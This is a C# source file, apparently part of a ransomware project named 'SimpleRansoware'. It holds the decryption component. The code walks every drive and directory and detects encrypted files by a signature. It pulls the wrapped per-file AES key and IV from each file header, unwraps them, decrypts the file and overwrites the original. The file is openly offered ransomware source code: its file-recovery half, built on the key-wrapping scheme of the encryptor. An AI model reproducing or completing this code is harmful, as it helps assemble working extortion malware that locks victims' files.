using System;
using System.Diagnostics;
using System.IO;

namespace SimpleRansoware
{
   /// <summary>
   /// Basic Decryption Strategy
   /// </summary>
    public sealed class DecryptionStrategy
    {
        /// <summary>
        /// Main Decryption Method
        /// </summary>
        public void DecryptDisk()
        {
#if DEBUG
            Trace.WriteLine("[*] DecryptDisk");
#endif
            // Enumerate All Device Disks
            DriveInfo[] drives = DriveInfo.GetDrives();

            // Force Generate Aes Engine
            CriptoKeyManager.RotateAesKey();

#if DEBUG
            Trace.WriteLine("[+] Drives Enumerated Successfully. " + drives.Length + " Drives Found");
#endif

            // Iterate Drivers
            foreach (DriveInfo drive in drives)
            {
                DecryptDrive(drive);
            }

        }


        /// <summary>
        /// Full Decrypt Drive
        /// </summary>
        /// <param name="drive"></param>
        private void DecryptDrive(DriveInfo drive)
        {
#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine("[*] DecryptDrive (" + drive.Name + ")");
            Trace.Indent();
#endif

            // Check Drive State
            if (drive.IsReady)
            {
                // Get All Folders
                DirectoryInfo[] directories = drive.RootDirectory.GetDirectories();

                // Encrypt All Directories
                foreach (DirectoryInfo di in directories)
                {
                    DecryptDirectory(di);
                }
            }
            else
            {
#if DEBUG
                Trace.WriteLine("[+] Drive is not Ready");
#endif
            }


#if DEBUG
            Trace.Unindent();
#endif
        }

        /// <summary>
        /// Decrypt a Directory
        /// </summary>
        /// <param name="di"></param>
        private void DecryptDirectory(DirectoryInfo di)
        {
#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine("[*] DecryptDirectory (" + di.Name + ")");
#endif
            // Check Directory Filter
            if (!Common.DirectoryInFilter(di.FullName))
            {
#if DEBUG
                Trace.Indent();
                Trace.WriteLine("[+] Directory Not in Filter");
                Trace.Unindent();
#endif
                return;
            }


            // Recursive Operation
            try
            {
                DirectoryInfo[] subDrives = di.GetDirectories();

                if (subDrives != null)
                {
                    foreach (DirectoryInfo subDirectory in subDrives)
                    {
                        DecryptDirectory(subDirectory);
                    }
                }

                // Decrypt All Drive Files
                FileInfo[] files = di.GetFiles();

                foreach (FileInfo file in files)
                {
                    DecryptFile(file);
                }
            }
            catch (Exception e)
            {
#if DEBUG
                Trace.WriteLine("");
                Trace.WriteLine("[!] Error While Read Directory");
                Trace.WriteLine(e.ToString());
#endif
            }
        }


        /// <summary>
        /// Decrypt a Single File
        /// </summary>
        /// <param name="file"></param>
        private void DecryptFile(FileInfo file)
        {
#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine("[*] DecryptFile (" + file.Name + ")");
            Trace.Indent();
#endif
            // File Signature Decision Gate
            if (Common.CheckSignature(file))
            {
#if DEBUG
                Trace.WriteLine("[+] File to Decrypt");
#endif
                // Read File Data
                byte[] encryptedFileKey;
                byte[] encryptedFileIv;
                byte[] fileKey = null;
                byte[] fileIv = null;
                byte[] fileRawData = null;
                int keyStartIndex;
                int ivStartIndex;
                string tempFileName = file.FullName + ".wrk";

                // Read File Data
                FileManager.ReadFile(file, ref fileRawData);

                // Compute Key Start Index
                keyStartIndex = ConfigurationManager.FILE_SIGNATURE_SIZE;

                // Get Key
                encryptedFileKey = new byte[CriptoKeyManager.CURRENT_FILE_ENCRIPTION_KEY.Length];
                Array.Copy(fileRawData, keyStartIndex, encryptedFileKey, 0, CriptoKeyManager.CURRENT_FILE_ENCRIPTION_KEY.Length);

                // Compute IV Start Index
                ivStartIndex = keyStartIndex + encryptedFileKey.Length;

                // Get Iv
                encryptedFileIv = new byte[CriptoKeyManager.CURRENT_FILE_ENCRIPTION_IV.Length];
                Array.Copy(fileRawData, ivStartIndex, encryptedFileIv, 0, CriptoKeyManager.CURRENT_FILE_ENCRIPTION_IV.Length);

                // Decrypt Key and Iv
                CriptoKeyManager.UnprotectAesKey(ref encryptedFileKey, ref fileKey, ref encryptedFileIv, ref fileIv);

                // Decrypt File
                using (FileStream fs = File.Create(tempFileName))
                {
                    fs.Position = 0;

                    // Write Encrypted Data
                    CriptoFileManager.Decrypt(fs, ref fileRawData, ConfigurationManager.FILE_SIGNATURE_SIZE + encryptedFileKey.Length + encryptedFileIv.Length, fileKey, fileIv);
                }

                // Delete Old File
                file.Delete();

                // Copy Temp File Into Old File
                File.Copy(tempFileName, file.FullName);

                // Remove Temp File
                File.Delete(tempFileName);
            }
            else
            {
#if DEBUG
                Trace.WriteLine("[+] File is Not Encrypted");
#endif
            }


#if DEBUG
            Trace.Unindent();
#endif
        }

    }
}
